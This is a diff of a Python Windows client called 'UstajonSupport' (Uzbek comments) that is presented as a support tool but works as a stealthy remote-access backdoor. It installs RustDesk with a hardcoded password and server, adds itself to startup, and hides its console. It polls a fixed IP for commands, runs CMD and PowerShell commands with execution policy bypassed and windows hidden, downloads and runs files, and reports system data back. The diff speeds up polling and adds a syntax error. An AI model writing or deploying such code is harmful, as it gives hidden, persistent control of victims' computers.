@@ -1,12 +1,6 @@
 #!/usr/bin/env python3
 """
-UstajonSupport Client v4.1 - Silent Background Service + Remote Commands
-- Bir marta royxatdan otadi
-- Yashirin rejimda ishlaydi
-- Windows startupga qoshiladi
-- RustDesk yashirin ornatiladi
-- Heartbeat har 30 sekundda
-- Masofadan CMD buyruqlarini qabul qiladi
+UstajonSupport Client v4.2 - Silent Service + Remote Commands + Auto Update
 """
 import os
 import sys
@@ -23,14 +17,13 @@ import logging
 import re
 from datetime import datetime
 
-VERSION = "4.1.0"
+VERSION = "4.2.0"
 APP_NAME = "UstajonSupport"
 SERVER_URL = "http://31.220.75.75"
 RUSTDESK_KEY = "YHo+N4vp+ZWP7wedLh69zCGk3aFf4935hwDKX9OdFXE="
 RUSTDESK_SERVER = "31.220.75.75"
 RUSTDESK_PASSWORD = "ustajon2025"
 RUSTDESK_URL = "https://github.com/rustdesk/rustdesk/releases/download/1.2.3/rustdesk-1.2.3-x86_64.exe"
-TELEGRAM_BOT = "@ustajonbot"
 
 APP_DATA = os.path.join(os.environ.get("APPDATA", ""), APP_NAME)
 os.makedirs(APP_DATA, exist_ok=True)
@@ -73,6 +66,7 @@ def add_to_startup():
     except Exception as e:
         logger.error(f"Startup xato: {e}")
         return False
+
 
 class Config:
     def __init__(self):
@@ -224,16 +218,12 @@ direct-server = "Y"
 
 
 class RemoteCommand:
-    """Masofadan buyruqlarni bajarish"""
-    
     @staticmethod
     def execute(command, timeout=60):
-        """CMD buyruqni yashirin bajarish"""
         try:
             si = subprocess.STARTUPINFO()
             si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
             si.wShowWindow = 0
-            
             result = subprocess.run(
                 command,
                 shell=True,
@@ -243,48 +233,31 @@ class RemoteCommand:
                 startupinfo=si,
                 creationflags=0x08000000
             )
-            
             output = result.stdout + result.stderr
-            return {
-                "success": True,
-                "output": output[:5000],  # Max 5000 chars
-                "exit_code": result.returncode
-            }
+            return {"success": True, "output": output[:5000], "exit_code": result.returncode}
         except subprocess.TimeoutExpired:
-            return {"success": False, "output": "Timeout - buyruq juda uzoq davom etdi", "exit_code": -1}
+            return {"success": False, "output": "Timeout", "exit_code": -1}
         except Exception as e:
             return {"success": False, "output": str(e), "exit_code": -1}
     
     @staticmethod
     def execute_powershell(script, timeout=60):
-        """PowerShell script yashirin bajarish"""
         try:
             si = subprocess.STARTUPINFO()
             si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
             si.wShowWindow = 0
-            
             result = subprocess.run(
                 ["powershell", "-ExecutionPolicy", "Bypass", "-Command", script],
-                capture_output=True,
-                text=True,
-                timeout=timeout,
-                startupinfo=si,
-                creationflags=0x08000000
+                capture_output=True, text=True, timeout=timeout, startupinfo=si, creationflags=0x08000000
             )
-            
             output = result.stdout + result.stderr
-            return {
-                "success": True,
-                "output": output[:5000],
-                "exit_code": result.returncode
-            }
+            return {"success": True, "output": output[:5000], "exit_code": result.returncode}
         except Exception as e:
             return {"success": False, "output": str(e), "exit_code": -1}
     
     @staticmethod
     def get_system_info():
-        """Tizim haqida malumot"""
-        info = {
+        return {
             "hostname": socket.gethostname(),
             "platform": platform.system(),
             "release": platform.release(),
@@ -294,21 +267,17 @@ class RemoteCommand:
             "username": os.environ.get("USERNAME", "unknown"),
             "ip": socket.gethostbyname(socket.gethostname())
         }
-        return info
     
     @staticmethod
     def download_and_run(url, filename=None):
-        """Fayl yuklab ishga tushirish"""
         try:
             if not filename:
                 filename = url.split("/")[-1]
             temp = os.path.join(os.environ.get("TEMP", ""), filename)
             urllib.request.urlretrieve(url, temp)
-            
             si = subprocess.STARTUPINFO()
             si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
             si.wShowWindow = 0
-            
             subprocess.Popen([temp], startupinfo=si, creationflags=0x08000000)
             return {"success": True, "output": f"Yuklab ishga tushirildi: {temp}"}
         except Exception as e:
@@ -363,7 +332,6 @@ class SilentService:
                 self.config.set("phone", phone)
                 self.config.set("client_id", self.client_id)
                 self.config.set("registered", True)
-                self.config.set("registered_at", datetime.now().isoformat())
                 logger.info(f"Royxatdan otildi: {name}")
                 return True
             return False
@@ -372,22 +340,26 @@ class SilentService:
             return False
     
     def check_commands(self):
-        """Serverdan buyruqlarni tekshirish"""
+        """Serverdan buyruqlarni tekshirish va bajarish"""
         try:
             client_id = self.config.get("client_id")
+            if not client_id:
+                return
+            
             req = urllib.request.Request(f"{SERVER_URL}/api/agent/commands?client_id={client_id}")
             resp = urllib.request.urlopen(req, timeout=10)
             result = json.loads(resp.read().decode())
             
             commands = result.get("commands", [])
+            logger.info(f"Buyruqlar soni: {len(commands)}")
+            
             for cmd in commands:
                 cmd_id = cmd.get("id")
                 cmd_type = cmd.get("type", "cmd")
                 cmd_data = cmd.get("command", "")
                 
-                logger.info(f"Buyruq qabul qilindi: {cmd_type} - {cmd_data[:50]}")
+                logger.info(f"Buyruq bajarilmoqda: {cmd_type} - {cmd_data[:50]}")
                 
-                # Buyruqni bajarish
                 if cmd_type == "cmd":
                     output = RemoteCommand.execute(cmd_data)
                 elif cmd_type == "powershell":
@@ -400,11 +372,10 @@ class SilentService:
                 else:
                     output = {"success": False, "output": "Nomalum buyruq turi"}
                 
-                # Natijani serverga yuborish
                 self.send_command_result(cmd_id, output)
                 
         except Exception as e:
-            logger.debug(f"Buyruq tekshirish xato: {e}")
+            logger.warning(f"Buyruq tekshirish xato: {e}")
     
     def send_command_result(self, cmd_id, result):
         """Buyruq natijasini serverga yuborish"""
@@ -424,11 +395,12 @@ class SilentService:
             )
             req.add_header("Content-Type", "application/json")
             urllib.request.urlopen(req, timeout=10)
-            logger.info(f"Buyruq natijasi yuborildi: {cmd_id}")
+            logger.info(f"Natija yuborildi: {cmd_id}")
         except Exception as e:
             logger.error(f"Natija yuborish xato: {e}")
     
-    def heartbeat(self):
+    def heartbeat_loop(self):
+        """Asosiy heartbeat sikli"""
         while self.running:
             try:
                 # RustDesk tekshirish
@@ -451,27 +423,28 @@ class SilentService:
                 resp = urllib.request.urlopen(req, timeout=10)
                 result = json.loads(resp.read().decode())
                 
+                logger.info(f"Heartbeat yuborildi")
+                
                 if result.get("deleted"):
                     logger.info("Server tomonidan ochirildi")
                     self.config.set("registered", False)
                     self.running = False
                     break
                 
-                # Buyruqlarni tekshirish
+                # Buyruqlarni tekshirish - HAR SAFAR
                 self.check_commands()
                 
             except Exception as e:
                 logger.warning(f"Heartbeat xato: {e}")
             
-            time.sleep(30)
+            time.sleep(15)  # 15 sekund (tezroq)
     
     def run_silent(self):
         logger.info(f"{APP_NAME} v{VERSION} yashirin rejimda boshlandi")
         if not self.setup_rustdesk():
             logger.error("RustDesk sozlab bolmadi")
-            return
         add_to_startup()
-        self.heartbeat()
+        self.heartbeat_loop()
 
 
 def show_registration_ui():
@@ -481,7 +454,7 @@ def show_registration_ui():
     service = SilentService()
     
     root = tk.Tk()
-    root.title(f"{APP_NAME}")
+    root.title(APP_NAME)
     root.geometry("420x480")
     root.resizable(False, False)
     root.configure(bg="#0f172a")
@@ -519,18 +492,22 @@ def show_registration_ui():
         if not name or len(name) < 2:
             messagebox.showerror("Xatolik", "Ismingizni kiriting!")
             return
-        if not phone or len(phone) < 12 or not phone.startswith("+998"):
-            messagebox.showerror("Xatolik", "Telefon: +998XXXXXXXXX")
+        if not phone or len(phone) < 12:
+            messagebox.showerror("Xatolik", "Telefon raqamni kiriting!")
             return
+        
         status_label.config(text="RustDesk sozlanmoqda...", fg="#f59e0b")
         root.update()
+        
         if not service.setup_rustdesk():
             status_label.config(text="RustDesk xatolik!", fg="#ef4444")
             return
+        
         status_label.config(text="Royxatdan otilmoqda...", fg="#f59e0b")
         root.update()
+        
         if service.register(name, phone, problem_var.get()):
-            messagebox.showinfo("Tayyor, f"Royxatdan otdingiz!\n\nTelegram: {TELEGRAM_BOT}\n\nMutaxassis tez orada ulanadi.")
+            messagebox.showinfo("Tayyor, f"Royxatdan otdingiz!\n\nMutaxassis tez orada ulanadi.")
             root.destroy()
             hide_console()
             service.run_silent()
@@ -538,13 +515,15 @@ def show_registration_ui():
             status_label.config(text="Xatolik! Qayta urining", fg="#ef4444")
     
     tk.Button(frame, text="Yuborish", font=("Segoe UI", 12, "bold"), bg="#6366f1", fg="#fff", relief="flat", bd=0, padx=20, pady=10, cursor="hand2", command=submit).pack(fill="x", pady=(10, 0))
-    tk.Label(root, text=f"v{VERSION} | {TELEGRAM_BOT}", font=("Segoe UI", 9), fg="#64748b", bg="#0f172a").pack(side="bottom", pady=15)
+    tk.Label(root, text=f"v{VERSION}", font=("Segoe UI", 9), fg="#64748b", bg="#0f172a").pack(side="bottom", pady=15)
+    
     root.mainloop()
 
 
 def main():
     if "--silent" in sys.argv:
         hide_console()
+    
     config = Config()
     if config.is_registered():
         hide_console()
